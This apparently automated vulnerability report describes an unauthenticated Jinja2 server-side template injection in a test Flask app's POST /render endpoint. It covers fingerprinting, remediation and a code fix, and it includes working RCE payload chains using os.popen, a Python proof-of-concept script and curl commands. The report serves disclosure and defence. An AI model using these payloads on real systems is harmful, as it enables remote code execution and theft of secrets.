╭─ VULN-0001 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Unauthenticated Jinja2 Server-Side Template Injection to Remote      │
│  Code Execution in POST /render (tpl)                                        │
│                                                                              │
│  Severity: CRITICAL                                                          │
│                                                                              │
│  CVSS Score: 9.8                                                             │
│                                                                              │
│  Target: /workspace/test-vuln-hard                                           │
│                                                                              │
│  Endpoint: /render                                                           │
│                                                                              │
│  Method: POST                                                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                            │
│                                                                              │
│  Description                                                                 │
│  The `tpl` form field of `POST /render` is passed directly to Flask's        │
│  `render_template_string`, so the value is compiled by the active Jinja2     │
│  environment as template source rather than rendered as data. An             │
│  unauthenticated attacker can therefore evaluate arbitrary Jinja2            │
│  expressions and escalate through reachable Python objects to execute        │
│  operating-system commands on the server. The module docstring describes     │
│  the sink as "Mako SSTI", but the imported function compiles Jinja2, which   │
│  is what actually executes.                                                  │
│                                                                              │
│  Impact                                                                      │
│  Remote, unauthenticated code execution in the security context of the       │
│  application process. Demonstrated consequences: disclosure of the full      │
│  Flask configuration object, execution of arbitrary shell commands with      │
│  output returned in the HTTP response (`id`, `uname -a`, arbitrary file      │
│  reads), which allows reading application secrets and database contents,     │
│  writing files, and pivoting to anything reachable from the host. Command    │
│  execution ran as the unprivileged service account, which limits immediate   │
│  privilege but yields complete application compromise.                       │
│                                                                              │
│  Technical Analysis                                                          │
│  The handler at `app.py:39-43` takes the raw request value and hands it to   │
│  `render_template_string` as the template body:                              │
│                                                                              │
│  ```python title=app.py startLineNumber=39 endLineNumber=43                  │
│  @app.route("/render", methods=["POST"])                                     │
│  def render():                                                               │
│      # (3) SSTI via a POST form field (not a query string)                   │
│      tpl = request.form.get("tpl", "hello")                                  │
│      return render_template_string(tpl)                                      │
│  ```                                                                         │
│                                                                              │
│  `flask.render_template_string(source, **context)` is a thin wrapper over    │
│  `app.jinja_env.from_string(source).render(context)`. The first positional   │
│  argument is the *template source*, so `request.form["tpl"]` is parsed by    │
│  the Jinja2 compiler and any `{{ ... }}`, `{% ... %}` or `{# ... #}`         │
│  constructs inside it are evaluated server-side. There is no sandbox         │
│  (`jinja2.sandbox.SandboxedEnvironment` is not used), no allowlist, and no   │
│  separation between template and data.                                       │
│                                                                              │
│  The docstring at `app.py:6` ("Mako SSTI in a POST form field (not Jinja2,   │
│  not a query string)") is inaccurate: `render_template_string` imports from  │
│  `flask` (`app.py:9`) and always uses the application's Jinja2 environment.  │
│  Runtime fingerprinting agrees — `{{7*'7'}}` evaluates to `7777777` (Jinja   │
│  string repetition; Twig would return `49`), and                             │
│  `{{self.__class__.__mro__}}` leaks `<class                                  │
│  'jinja2.runtime.TemplateReference'>`. Mako-style `${7*7}` and ERB-style     │
│  `<%= 7*7 %>` are returned literally unrendered. This matters for            │
│  remediation: hardening guidance aimed at Mako does not apply, and the fix   │
│  must address Jinja2 specifically.                                           │
│                                                                              │
│  Escalation follows the standard Jinja2 path. The default environment        │
│  exposes the `cycler`, `lipsum`, `joiner`, `namespace` and `config`          │
│  globals. `cycler` is a function, so `cycler.__init__.__globals__` exposes   │
│  the defining module's globals — including the `os` module imported by       │
│  `jinja2.utils`. From there `os.popen(...).read()` returns command output    │
│  directly into the response body. Equivalent chains exist through            │
│  `config.__class__.__init__.__globals__` and through                         │
│  `"".__class__.__mro__[1].__subclasses__()[167]`                             │
│  (`_wrap_close.__init__.__globals__`). No deny-lists, attribute filters, or  │
│  sandbox restrictions are present to break any of these chains.              │
│                                                                              │
│  Because the whole application is unauthenticated and the route has no       │
│  CSRF/authorization layer, the vulnerability is reachable by any client      │
│  that can reach the port. Exploitation requires no user interaction and no   │
│  prior privileges.                                                           │
│                                                                              │
│  PoC Description                                                             │
│  1. Start the application (a private copy of `app.py` was used with its own  │
│  seeded database, bound to a test port, so the original directory was not    │
│  modified).                                                                  │
│  2. Send a benign baseline request to prove the field is normally reflected  │
│  as data: POST `tpl=hello`. The response body is `hello`.                    │
│  3. Send a template expression as the same field: POST `tpl={{7*7}}`. The    │
│  response body is `49`.                                                      │
│  4. Send a second, different expression to rule out coincidence or           │
│  hard-coded reflection: POST `tpl={{7*8}}`. The response body is `56`.       │
│  5. Fingerprint the engine: POST `tpl={{7*'7'}}` returns `7777777` and POST  │
│  `tpl={{self.__class__.__mro__}}` returns `<class                            │
│  'jinja2.runtime.TemplateReference'>`, identifying Jinja2. Mako `${7*7}`     │
│  and ERB `<%= 7*7 %>` are returned literally.                                │
│  6. Confirm access to framework globals: POST `tpl={{config}}` returns the   │
│  fully rendered Flask configuration object.                                  │
│  7. Reach code execution: POST                                               │
│  `tpl={{cycler.__init__.__globals__.os.popen("id").read()}}` returns         │
│  `uid=1000(pentester) gid=1000(pentester) groups=1000(pentester),27(sudo)`.  │
│  8. Confirm arbitrary command execution beyond identity: POST                │
│  `tpl={{cycler.__init__.__globals__.os.popen("uname -a").read()}}` returns   │
│  the host kernel banner, and POST                                            │
│  `tpl={{cycler.__init__.__globals__.os.popen("cat                            │
│  <path>/marker.txt").read()}}` returns the contents of a marker file         │
│  created for the test.                                                       │
│  9. Confirm the chain is not specific to one gadget by repeating with        │
│  `{{config.__class__.__init__.__globals__["os"].popen("echo                  │
│  hi_from_config_gadget; id").read()}}`,                                      │
│  `{{"".__class__.__mro__[1].__subclasses__()[167].__init__.__globals__["__b  │
│  uiltins__"]["__import__"]("os").popen("id").read()}}` and                   │
│  `{{lipsum.__globals__["os"].popen("id").read()}}` — all returned command    │
│  output.                                                                     │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  import re                                                                   │
│  import requests                                                             │
│                                                                              │
│  BASE = "http://127.0.0.1:8111/render"                                       │
│                                                                              │
│  # Payloads exactly as sent in the form body                                 │
│  (application/x-www-form-urlencoded).                                        │
│  PAYLOADS = {                                                                │
│      "baseline": "hello",                                                    │
│      "math_1": "{{7*7}}",                                                    │
│      "math_2": "{{7*8}}",                                                    │
│      "engine_fingerprint": "{{7*'7'}}",                                      │
│      "mro_fingerprint": "{{self.__class__.__mro__}}",                        │
│      "config_disclosure": "{{config}}",                                      │
│      "rce_id": '{{cycler.__init__.__globals__.os.popen("id").read()}}',      │
│      "rce_uname": '{{cycler.__init__.__globals__.os.popen("uname             │
│  -a").read()}}',                                                             │
│      "rce_marker": '{{cycler.__init__.__globals__.os.popen("cat              │
│  /workspace/ssti-render-work/marker.txt").read()}}',                         │
│      "rce_config_gadget":                                                    │
│  '{{config.__class__.__init__.__globals__["os"].popen("echo                  │
│  hi_from_config_gadget; id").read()}}',                                      │
│      "rce_subclasses_gadget":                                                │
│  '{{"".__class__.__mro__[1].__subclasses__()[167].__init__.__globals__["__b  │
│  uiltins__"]["__import__"]("os").popen("id").read()}}',                      │
│      "rce_lipsum_gadget":                                                    │
│  '{{lipsum.__globals__["os"].popen("id").read()}}',                          │
│      # Negative controls: these would fire on Mako / ERB, not Jinja2.        │
│      "mako_probe": "${7*7}",                                                 │
│      "erb_probe": "<%= 7*7 %>",                                              │
│  }                                                                           │
│                                                                              │
│  for name, payload in PAYLOADS.items():                                      │
│      r = requests.post(BASE, data={"tpl": payload}, timeout=15)              │
│      body = r.text                                                           │
│      if name == "config_disclosure":                                         │
│          body = body[:160] + " ..."                                          │
│      print(f"[{name}] status={r.status_code} payload={payload!r}")           │
│      print(f"    response={body!r}")                                         │
│                                                                              │
│  # Machine check: command output must contain a uid= line.                   │
│  r = requests.post(BASE, data={"tpl": PAYLOADS["rce_id"]}, timeout=15)       │
│  assert re.search(r"uid=\d+", r.text), "command output not reflected"        │
│  print("\nCONFIRMED: unauthenticated command execution with output in the    │
│  HTTP response")                                                             │
│  ```                                                                         │
│                                                                              │
│  Equivalent raw curl commands (identical, using automatic form encoding):    │
│                                                                              │
│  ```bash                                                                     │
│  curl -s -X POST --data-urlencode 'tpl=hello'                                │
│  http://127.0.0.1:8111/render                                                │
│  curl -s -X POST --data-urlencode 'tpl={{7*7}}'                              │
│  http://127.0.0.1:8111/render                                                │
│  curl -s -X POST --data-urlencode 'tpl={{7*8}}'                              │
│  http://127.0.0.1:8111/render                                                │
│  curl -s -X POST --data-urlencode 'tpl={{config}}'                           │
│  http://127.0.0.1:8111/render                                                │
│  curl -s -X POST --data-urlencode                                            │
│  'tpl={{cycler.__init__.__globals__.os.popen("id").read()}}'                 │
│  http://127.0.0.1:8111/render                                                │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:39-43                                                  │
│    Root cause: user input passed as the Jinja2 template source               │
│    @app.route("/render", methods=["POST"])                                   │
│  def render():                                                               │
│      # (3) SSTI via a POST form field (not a query string)                   │
│      tpl = request.form.get("tpl", "hello")                                  │
│      return render_template_string(tpl)                                      │
│    Fix:                                                                      │
│    - @app.route("/render", methods=["POST"])                                 │
│  def render():                                                               │
│      # (3) SSTI via a POST form field (not a query string)                   │
│      tpl = request.form.get("tpl", "hello")                                  │
│      return render_template_string(tpl)                                      │
│    + @app.route("/render", methods=["POST"])                                 │
│  def render():                                                               │
│      # (3) user input is data, never template source                         │
│      name = request.form.get("tpl", "hello")                                 │
│      return render_template_string("Hello {{ name }}", name=name)            │
│                                                                              │
│    Location 2: app.py:6                                                      │
│    Supporting: docstring misidentifies the engine, which misdirects          │
│  remediation                                                                 │
│      3. Mako SSTI in a POST form field (not Jinja2, not a query string)      │
│    Fix:                                                                      │
│    -   3. Mako SSTI in a POST form field (not Jinja2, not a query string)    │
│    +   3. Jinja2 SSTI in a POST form field (Flask render_template_string,    │
│  not Mako)                                                                   │
│                                                                              │
│  Remediation                                                                 │
│  Stop compiling user input as a template. The root cause is that the         │
│  request value is passed as the *template source* argument of                │
│  `render_template_string`. Make the template a fixed, developer-controlled   │
│  constant (or a file under `templates/`) and pass the user-supplied value    │
│  as a context variable so Jinja only ever renders it as data. The suggested  │
│  code change implements this: a constant `"Hello {{ name }}"` template with  │
│  `name=tpl` passed in the context, which preserves the intended "echo the    │
│  submitted value" behaviour while eliminating evaluation.                    │
│                                                                              │
│  If the product genuinely requires caller-supplied templates (a user-facing  │
│  template editor), then a fixed template is not an option and the            │
│  alternative is a `jinja2.sandbox.SandboxedEnvironment` with                 │
│  `autoescape=True`, an empty or explicit allowlist of globals/filters, and   │
│  rendering of untrusted templates restricted to a non-privileged context.    │
│  That route is materially harder to secure — Jinja sandbox advisories and    │
│  sandbox-escape gadget chains recur — and should be treated as a last        │
│  resort with independent security review, not as equivalent to the           │
│  fixed-template fix.                                                         │
│                                                                              │
│  Additionally: correct the module docstring, which states the sink is Mako;  │
│  the actual engine is Jinja2, and remediation guidance must match the real   │
│  engine. As defence in depth, run the service as a dedicated unprivileged    │
│  account with no access to the database file's directory beyond what it      │
│  needs, and apply a request-size cap, since none of these measures address   │
│  the root cause on their own.                                                │
│                                                                              │
